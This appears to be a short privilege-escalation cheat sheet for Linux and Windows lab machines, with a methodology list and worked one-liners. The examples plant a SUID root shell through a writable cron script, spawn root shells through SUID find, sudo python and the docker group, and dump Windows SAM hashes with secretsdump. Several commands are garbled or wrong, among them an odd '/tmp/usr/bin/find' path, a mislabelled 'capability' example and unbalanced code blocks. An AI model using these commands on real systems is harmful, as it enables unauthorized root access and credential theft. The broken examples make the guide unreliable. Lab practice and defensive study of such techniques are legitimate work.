# HOW TO TEST PRIVILEGE ESCALATION ON YOUR LAB BOX (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN
Linux + Windows privesc methodology (do it on your own VM / authorized environment).

## The N ways to test (Linux)
1. sudo -l: any NOPASSWD binary? go GTFOBins.
2. SUID find: /usr/bin/* with +s -> exploit or gtfobins.
3. Capabilities: getcap -r / 2>/dev/null -> cap_setuid on any binary.
4. Writable service/systemd unit or timer -> payload as root on boot.
5. Kernel CVE by uname -> check 2026 list in linux-privesc-2026-updates.txt.
6. Env vars: LD_PRELOAD via sudo env_keep; PATH hijack for a crontab binary.
7. Cron jobs: writable script run as root; wildcard + tar trick.
8. Misconfigs: ./ssh keys, /etc/shadow readable, tmux sessions, docker group.
9. Files with creds: .bash_history, .ssh, config files, backups.
10. Research jumps: GTFOBins lookup for every SUID/sudo binary filename.

## Step-by-step on Linux lab
1. Automated sweep first: linpeas.sh -a | tee out   (or LinEnum/Spartack/JAWS)
2. Manual loop on any hit:
   - linux-exploit-suggester-2.py
   - ./linpeas.sh -s (SUID extras)
   - check $PATH + crontab -l
3. Try the cheapest 5 always: sudo -l, find / -perm -4000, getcap, writable systemd, cron.
4. For each candidate: owner/perms -> how it helps (GTFOBins page) -> drop the PoC.

## Step-by-step on Windows lab
1. whoami /priv -> SeImpersonate+GodPotato; BackupOperator SAM reg save.
2. Services: unquoted path + weak SDDL -> swap binary.
3. Scheduled tasks editable -> new action.
4. cmdkey /runas /savecred, saved creds, unattend.xml.
5. Kernel + available exploits mapping by OS build.

## Worked examples (concrete)
Linux quick sweep one-liners:
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null | grep -v '^/usr/bin/true'  # actually grep cap_setuid
find / -writable -name "*.service" 2>/dev/null
crontab -l; ls -la /etc/cron*
writable cron script takeover (lab):
```
echo -e '#!/bin/bash\ncp /bin/sh /tmp/root && chmod 4755 /tmp/root' > /usr/local/bin/backup.sh
next cron-run gives you SUID /tmp/root -> /tmp/root -p
SUID+gtfobins (example "find"):
```
find / -perm -4000 2>/dev/null | xargs -I{} ls -la {}   # find find!
/tmp/usr/bin/find . -exec /bin/sh -p \; -quit
sudo NOPASSWD python:
```
echo 'import os;os.system("/bin/bash -p")' > /tmp/pe.py && sudo python3 /tmp/pe.py
docker group:
```
docker run -v /:/host -it alpine /bin/sh -c "chroot /host"
capability perl:
cp /usr/bin/perl /tmp/p; chmod +s /tmp/p; /tmp/p -e 'setuid(0); system("/bin/sh")'
Windows: SeImpersonate +
GodPotato.exe -cmd "cmd /c whoami"    (drop on your win test VM)
Windows backup-operator SAM:
reg save HKLM\\SAM sam.hiv; reg save HKLM\\SYSTEM sys.hiv; secretsdump -sam sam.hiv -system sys.hiv LOCAL

## False positives
- A sudo arm but no = /bin/sh trick (apt, lsof) may still drop you a root shell - verify with whoami.
- Kernel exploit name matching old distro = STILL measure patchlevel (uname -r) - many "exploitable" are patched.

## Tools
- LinPEAS/LinEnum/pspy/linux-exploit-suggester on Linux; winPEAS/Seatbelt/PowerUp/PrivescCheck on Windows.
